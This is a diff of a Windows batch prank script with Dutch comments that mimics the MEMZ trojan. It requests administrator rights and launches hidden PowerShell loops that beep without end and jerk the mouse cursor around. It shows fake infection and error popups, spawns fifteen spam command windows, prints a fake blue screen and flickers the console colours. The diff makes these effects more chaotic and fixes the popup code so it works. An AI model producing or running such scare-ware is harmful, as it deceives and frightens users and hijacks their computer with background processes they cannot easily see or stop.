@@ -4,23 +4,23 @@ color 0C
 cls
 setlocal enabledelayedexpansion
 
-:: Check of script met adminrechten draait
+:: --- ADMIN CHECK & RESTART MET ADMIN ---
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo Bezig met aanvragen van administratorrechten...
-    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
     exit /b
 )
 
-:: Start piep geluid (PowerShell)
+:: --- START CHAOTISCH PEEP GELUID (POWERHELL IN ACHTERGROND) ---
 start "" powershell -WindowStyle Hidden -Command ^
-"while ($true) { [console]::beep(800, 200); Start-Sleep -Milliseconds 3000 }" >nul 2>&1
+"while ($true) { $freq = Get-Random -Minimum 600 -Maximum 1200; [console]::beep($freq, 200); Start-Sleep -Milliseconds 500 }" >nul 2>&1
 
-:: Cursor chaos via PowerShell (background)
+:: --- CHAOTISCH BEWEGENDE MUIS ---
 start "" powershell -WindowStyle Hidden -Command ^
 "Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)), (Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height))); Start-Sleep -Milliseconds 100 }" >nul 2>&1
 
-:: Popups
+:: --- POPUPS TEKENEN DIE BLIJVEN OPENSTAAN ---
 set msgs[0]=Windows cannot find the file: memz.exe|Windows Error|0|16
 set msgs[1]=Your system is now infected with MEMZ!|MEMZ|0|48
 set msgs[2]=Error 0xDEADBEEF: System file corrupted|Critical System Error|0|16
@@ -33,13 +33,13 @@ set msgs[8]=Fatal exception at 0x7FFFFFFF|Fatal Error|0|16
 
 for /L %%i in (0,1,8) do (
     for /F "tokens=1-4 delims=|" %%a in ("!msgs[%%i]!") do (
-        start "" powershell -NoProfile -WindowStyle Hidden -Command ^
-        "Add-Type -AssemblyFramework; [System.Windows.MessageBox]::Show('%%a','%%b',%%c,%%d)"
+        start "" powershell -NoProfile -Command ^
+        "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('%%a','%%b',%%c,%%d)"
     )
     timeout /t 1 >nul
 )
 
-:: Maak spam script en start CMD vensters (zelfde als voorheen)
+:: --- CMD VENSTERS MET FAKE ERRORS (SPAM) ---
 set spamScript=%temp%\memz_spam.cmd
 (
 echo @echo off
@@ -62,14 +62,14 @@ for /L %%i in (1,1,15) do (
     start "" cmd /k "%spamScript%"
 )
 
-:: Glitchy terminal output
+:: --- GLITCHY TERMINAL OUTPUT IN HOOFDVENSTER ---
 cls
 for /L %%g in (1,1,60) do (
     echo %%g ^#@!$%%&*()_+= MEMZ.EXE glitch error %%g []~~~
-    timeout /t 0.05 >nul
+    ping 127.0.0.1 -n 1 >nul
 )
 
-:: Kleur flash
+:: --- KNIPPERENDE KLEUREN ---
 for /L %%c in (1,1,10) do (
     color 0C
     ping 127.0.0.1 -n 1 >nul
@@ -79,7 +79,7 @@ for /L %%c in (1,1,10) do (
     ping 127.0.0.1 -n 1 >nul
 )
 
-:: Fake BSOD style
+:: --- FAKE BSOD ---
 cls
 color 1F
 echo A problem has been detected and Windows has been shut down to prevent damage.
@@ -88,12 +88,11 @@ echo *** STOP: 0x000000DEAD (0xDEADBEEF, 0xBAADF00D, 0xFEE1DEAD)
 echo Dumping physical memory to disk: 100%%
 ping 127.0.0.1 -n 6 >nul
 
-:: Scherm flikkeren en chaos loop
+:: --- CHAOS LOOP MET FLICKEREN ---
 :loop
-set /A randColor=!random! %% 15 + 1
+set /A randColor=!random! %% 9 + 1
 color 0!randColor!
 
-:: Print random lege regels voor extra knipper-effect
 set /A blankLines=!random! %% 5 + 1
 for /L %%x in (1,1,!blankLines!) do echo.
 
